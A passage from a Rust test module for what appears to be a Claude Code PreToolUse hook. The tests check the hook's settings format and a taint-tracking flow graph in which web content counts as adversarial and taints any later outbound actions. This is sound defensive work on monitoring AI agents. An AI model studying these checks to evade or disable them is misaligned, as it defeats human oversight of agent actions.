        // Record trusted source
        leaves.record(NodeKind::FileRead, 1);
        assert_eq!(leaves.trusted, vec![1]);
        assert!(leaves.adversarial.is_empty());

        // Record adversarial source (independent)
        leaves.record(NodeKind::WebContent, 2);
        assert_eq!(leaves.adversarial, vec![2]);
        assert_eq!(leaves.trusted, vec![1]); // unchanged

        // New trusted source replaces old leaf
        leaves.record(NodeKind::FileRead, 3);
        assert_eq!(leaves.trusted, vec![3]); // replaced

        // OutboundAction parents include both categories
        let action_parents = leaves.parents_for(NodeKind::OutboundAction);
        assert!(action_parents.contains(&3)); // trusted
        assert!(action_parents.contains(&2)); // adversarial

        // FileRead parents only include trusted
        let read_parents = leaves.parents_for(NodeKind::FileRead);
        assert!(read_parents.contains(&3)); // trusted
        assert!(!read_parents.contains(&2)); // NOT adversarial
    }

    // -----------------------------------------------------------------------
    // --setup format validation (#519)
    // -----------------------------------------------------------------------

    #[test]
    fn test_setup_produces_valid_hooks_format() {
        // Simulate what run_setup() generates (without writing to disk)
        let binary = "/usr/local/bin/nucleus-claude-hook";
        let settings = serde_json::json!({
            "hooks": {
                "PreToolUse": [
                    {
                        "matcher": "",
                        "hooks": [
                            {
                                "type": "command",
                                "command": binary
                            }
                        ]
                    }
                ]
            }
        });

        // Validate structure matches Claude Code's expected schema
        let hooks = settings.get("hooks").expect("hooks key missing");
        let pre_tool = hooks.get("PreToolUse").expect("PreToolUse key missing");
        let arr = pre_tool.as_array().expect("PreToolUse should be array");
        assert!(!arr.is_empty(), "PreToolUse array should not be empty");

        let entry = &arr[0];
        assert!(entry.get("matcher").is_some(), "entry needs matcher field");
        assert_eq!(
            entry.get("matcher").unwrap().as_str().unwrap(),
            "",
            "matcher should be empty string to match all tools"
        );

        let hooks_arr = entry
            .get("hooks")
            .expect("hooks array missing")
            .as_array()
            .expect("hooks should be array");
        assert!(!hooks_arr.is_empty());

        let hook = &hooks_arr[0];
        assert_eq!(
            hook.get("type").unwrap().as_str().unwrap(),
            "command",
            "hook type must be 'command'"
        );
        assert!(hook.get("command").is_some(), "hook needs command field");
    }

    #[test]
    fn test_setup_preserves_existing_settings() {
        // If settings.json already has other fields, setup should preserve them
        let mut settings = serde_json::json!({
            "effortLevel": "high",
            "enabledPlugins": {"rust-analyzer": true}
        });

        // Simulate adding hooks (what run_setup does)
        let hooks = settings
            .as_object_mut()
            .unwrap()
            .entry("hooks")
            .or_insert_with(|| serde_json::json!({}));
        let hooks_obj = hooks.as_object_mut().unwrap();
        hooks_obj.insert(
            "PreToolUse".to_string(),
            serde_json::json!([{
                "matcher": "",
                "hooks": [{"type": "command", "command": "nucleus-claude-hook"}]
            }]),
        );

        // Verify existing fields preserved
        assert_eq!(
            settings.get("effortLevel").unwrap().as_str().unwrap(),
            "high"
        );
        assert!(settings.get("enabledPlugins").is_some());
        assert!(settings.get("hooks").is_some());
    }

    #[test]
    fn test_flow_graph_with_post_tool_observations() {
        // Verify that PostToolUse observations are correctly replayed
        // into the flow graph during session replay, creating proper
        // causal links so taint propagates through tool outputs.
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);
        kernel.enable_flow_graph();

        let mut leaves = LeafTracker::default();

        // Simulate replay of a web fetch observation (PreToolUse)
        let web_parents = leaves.parents_for(NodeKind::WebContent);
        let web_id = kernel.observe(NodeKind::WebContent, &web_parents).unwrap();
        leaves.record(NodeKind::WebContent, web_id);

        // Simulate replay of the WebContent post-tool observation (PostToolUse)
        // This should go into the adversarial category, maintaining taint
        let post_parents = leaves.parents_for(NodeKind::WebContent);
        let post_id = kernel.observe(NodeKind::WebContent, &post_parents).unwrap();
        leaves.record(NodeKind::WebContent, post_id);

        // Now try a write action — it should inherit the web content taint
        let write_parents = leaves.parents_for(NodeKind::OutboundAction);
        // The write's parents should include the adversarial leaf
        assert!(
            write_parents.contains(&post_id),
            "Write action should depend on post-tool WebContent observation"
        );
    }
}
